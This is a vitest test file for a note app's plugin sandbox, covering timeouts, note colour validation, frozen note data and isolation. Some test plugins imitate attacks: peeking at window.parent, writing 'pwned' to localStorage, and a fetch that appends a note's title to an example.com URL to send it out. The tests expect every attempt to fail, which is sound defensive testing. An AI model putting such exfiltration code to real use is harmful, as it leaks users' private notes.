import type { NoteColor } from "@manifesto/shared";
import { afterEach, describe, expect, it } from "vitest";
import openTasksExample from "../../../../docs/examples/open-tasks.js?raw";
import { defined } from "../test/defined.js";
import { resetSandbox, runPlugin } from "./sandbox.js";
import type { ApproxLabels } from "./stdlib.js";

const EN_LABELS: ApproxLabels = {
  today: "Today",
  tomorrow: "Tomorrow",
  dayAfterTomorrow: "The day after tomorrow",
  yesterday: "Yesterday",
  inNDays: "In {n} days",
  inAWeek: "In a week",
  inNWeeks: "In {n} weeks",
  underNWeeks: "Less than {n} weeks away",
  inAMonth: "In a month",
  nDaysAgo: "{n} days ago",
  aWeekAgo: "A week ago",
  nWeeksAgo: "{n} weeks ago",
  underNWeeksAgo: "Less than {n} weeks ago",
  aMonthAgo: "A month ago",
};

const CTX = {
  today: "2026-04-23",
  locale: "en",
  approxLabels: EN_LABELS,
};

describe("sandbox", () => {
  afterEach(() => {
    resetSandbox();
  });

  it("runs a trivial plugin and returns a note", async () => {
    const src = `
      const fn = (ctx) => ({ title: "Hi", content: "hello " + ctx.today });
      _default = fn;
    `;
    const notes = await runPlugin(src, CTX);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.title).toBe("Hi");
    expect(notes[0]?.content).toBe("hello 2026-04-23");
  });

  it("supports an array of plugin functions", async () => {
    const src = `
      _default = [
        () => ({ title: "A", content: "one" }),
        () => ({ title: "B", content: "two" }),
      ];
    `;
    const notes = await runPlugin(src, CTX);
    expect(notes).toHaveLength(2);
    expect(notes[0]?.title).toBe("A");
    expect(notes[1]?.title).toBe("B");
  });

  it("exposes stdlib functions bound to the locale", async () => {
    const src = `
      _default = ({ today, stdlib }) => ({
        title: "relative",
        content: stdlib.approxUntil(stdlib.addDays(today, 1), today),
      });
    `;
    const notes = await runPlugin(src, CTX);
    expect(notes[0]?.content).toBe("Tomorrow");
  });

  it("surfaces plugin exceptions as rejected promises", async () => {
    const src = `
      _default = () => { throw new Error("boom"); };
    `;
    await expect(runPlugin(src, CTX)).rejects.toThrow(/boom/);
  });

  it("rejects notes with missing required fields", async () => {
    const src = `
      _default = () => ({ color: "blue" });
    `;
    await expect(runPlugin(src, CTX)).rejects.toThrow(
      /string title and content/,
    );
  });

  it("times out a plugin that never returns, and rebuilds", async () => {
    // The plugin this exists for. Before plugins ran on their own thread
    // this test could not be written: the loop occupied the thread the host
    // timer needed, so the tab hung instead of timing out, and the test had
    // to fake a non-responsive plugin by throwing an object whose `.message`
    // getter threw.
    const spinSrc = `_default = () => { while (true) {} };`;
    await expect(runPlugin(spinSrc, CTX, 300)).rejects.toThrow(/timed out/);

    // A fresh invocation should still work: the sandbox was rebuilt, and
    // tearing down the frame took its spinning worker with it.
    const okSrc = `_default = () => ({ title: "ok", content: "still here" });`;
    const notes = await runPlugin(okSrc, CTX);
    expect(notes[0]?.title).toBe("ok");
  }, 10_000);

  it("leaves the host's event loop running while a plugin spins", async () => {
    const spinSrc = `_default = () => { while (true) {} };`;
    const ticks: number[] = [];
    const ticker = setInterval(() => ticks.push(Date.now()), 20);
    try {
      await expect(runPlugin(spinSrc, CTX, 300)).rejects.toThrow(/timed out/);
    } finally {
      clearInterval(ticker);
    }
    // A blocked main thread would have starved the interval entirely; the
    // timeout itself is the other half of the same evidence.
    expect(ticks.length).toBeGreaterThan(3);
  }, 10_000);

  it("drops a colour the plugin invented", async () => {
    // The host validates, so `noteColorMap[color]` can't be handed a string
    // it has no entry for, which threw while a card rendered.
    const src = `
      _default = () => ({ title: "t", content: "c", color: "hotpink" });
    `;
    const notes = await runPlugin(src, CTX);
    expect(defined(notes[0]).color).toBeUndefined();
  });

  it("keeps a note whose sibling fields are not serializable", async () => {
    // JSON on the wire rather than a structured clone: a function-valued
    // field would make `postMessage` throw a DataCloneError, which would
    // surface as a sandbox fault rather than as the plugin's own doing.
    const src = `
      _default = () => ({ title: "t", content: "c", render: () => 1 });
    `;
    const notes = await runPlugin(src, CTX);
    expect(notes[0]?.title).toBe("t");
  });

  it("refuses a run that returns more notes than the cap", async () => {
    const src = `
      _default = () => {
        const out = [];
        for (let i = 0; i < 500; i++) out.push({ title: "t", content: "c" });
        return out;
      };
    `;
    await expect(runPlugin(src, CTX)).rejects.toThrow(/the limit is 100/);
  });

  it("gives a plugin no window to reach the host through", async () => {
    // A worker has no `window` at all, and the frame that owns it has an
    // opaque origin, so the fallback path throws SecurityError here instead.
    const src = `
      _default = () => {
        const title = window.parent.document.title;
        return { title, content: "peeked" };
      };
    `;
    await expect(runPlugin(src, CTX)).rejects.toThrow();
  });

  it("has no access to host localStorage", async () => {
    // Unavailable in a worker; and denied to an opaque origin on the
    // fallback path, where `setItem` throws SecurityError.
    const src = `
      _default = () => {
        localStorage.setItem("pwned", "yes");
        return { title: "x", content: "y" };
      };
    `;
    await expect(runPlugin(src, CTX)).rejects.toThrow();
  });

  describe("with notes to read", () => {
    const note = {
      id: "01J",
      title: "Shopping",
      content: "- [ ] milk\n- [x] bread",
      tags: ["todo"],
      color: "default" as NoteColor,
      pinned: false,
      archived: false,
      createdAt: "2026-04-01T00:00:00.000Z",
      updatedAt: "2026-04-02T00:00:00.000Z",
    };
    const reading = { ...CTX, reads: ["todo"], notes: [note] };

    it("hands the plugin the notes and the tags it reads", async () => {
      const src = `
        _default = (ctx) => ({
          title: ctx.reads.join(","),
          content: ctx.notes.map((n) => n.title + ":" + n.tags[0]).join(";"),
        });
      `;
      const [out] = await runPlugin(src, reading);
      expect(out).toMatchObject({ title: "todo", content: "Shopping:todo" });
    });

    it("gives a plugin that reads nothing an empty list, not a missing one", async () => {
      const src = `
        _default = (ctx) => ({
          title: String(ctx.notes.length),
          content: String(ctx.reads.length),
        });
      `;
      expect(await runPlugin(src, CTX)).toEqual([{ title: "0", content: "0" }]);
    });

    it("freezes what it hands over, so nothing can be written through it", async () => {
      const src = `
        _default = (ctx) => {
          "use strict";
          const frozen = [
            Object.isFrozen(ctx.notes),
            Object.isFrozen(ctx.notes[0]),
            Object.isFrozen(ctx.notes[0].tags),
            Object.isFrozen(ctx.reads),
          ];
          let threw = false;
          try { ctx.notes[0].title = "changed"; } catch { threw = true; }
          return { title: frozen.join(","), content: String(threw) };
        };
      `;
      const [out] = await runPlugin(src, reading);
      expect(out).toMatchObject({
        title: "true,true,true,true",
        content: "true",
      });
    });

    it("runs the example that gathers open tasks", async () => {
      const allowed = await runPlugin(openTasksExample, {
        ...CTX,
        reads: ["todo"],
        notes: [
          note,
          { ...note, id: "02J", title: "", content: "[ ] call the plumber" },
          { ...note, id: "03J", title: "Done", content: "- [x] all of it" },
          { ...note, id: "04J", title: "Old", archived: true },
        ],
      });
      expect(allowed).toHaveLength(1);
      expect(allowed[0]?.title).toBe("Open tasks (2)");
      expect(allowed[0]?.content).toBe(
        "**Shopping**\n- milk\n\n**Untitled**\n- call the plumber",
      );

      // Not yet allowed: it says what to do instead of showing nothing.
      const [asking] = await runPlugin(openTasksExample, CTX);
      expect(asking?.content).toContain("Allow");
    });

    it("leaves a plugin holding notes no way to send them out", async () => {
      // The frame's policy denies every connection, and a worker inherits it.
      const src = `
        _default = (ctx) => {
          const tried = [];
          try {
            fetch("https://example.com/?" + ctx.notes[0].title);
            tried.push("fetch did not throw");
          } catch (err) { tried.push("fetch threw"); }
          tried.push(typeof XMLHttpRequest === "undefined" ? "no xhr" : "xhr");
          tried.push(typeof location === "object" ? "location" : "no location");
          let navigated = "blocked";
          try { location.href = "https://example.com/"; navigated = "set"; }
          catch (err) { navigated = "blocked"; }
          tried.push(typeof document);
          return { title: tried.join(";"), content: navigated };
        };
      `;
      const [out] = await runPlugin(src, reading);
      // No document to make an image or a form with, and a worker's location
      // is read-only: assigning to it goes nowhere.
      expect(out?.title).toContain("undefined");
      const again = await runPlugin(
        `_default = () => ({ title: "still here", content: "" });`,
        reading,
      );
      expect(again[0]?.title).toBe("still here");
    });
  });
});
